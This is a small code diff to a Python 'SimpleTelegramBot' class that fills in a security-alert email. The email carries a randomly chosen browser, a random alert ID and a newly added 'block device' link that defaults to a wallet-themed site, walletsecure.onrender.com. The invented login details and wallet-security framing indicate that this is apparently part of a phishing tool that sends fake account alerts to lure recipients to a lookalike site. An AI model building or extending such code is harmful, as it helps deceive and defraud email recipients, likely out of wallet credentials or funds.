@@ -56,7 +56,8 @@ class SimpleTelegramBot:
                 'browser_info': random.choice(['Chrome 120.0', 'Safari 17.2', 'Firefox 121.0']),
                 'login_time': datetime.now().strftime('%B %d, %Y at %I:%M %p'),
                 'alert_time': datetime.now().strftime('%I:%M %p UTC'),
-                'alert_id': f'WS{random.randint(100000, 999999)}'
+                'alert_id': f'WS{random.randint(100000, 999999)}',
+                'block_device_url': os.getenv('BLOCK_DEVICE_URL', 'https://walletsecure.onrender.com')
             }
             
             result = await self.email_service.send_email(
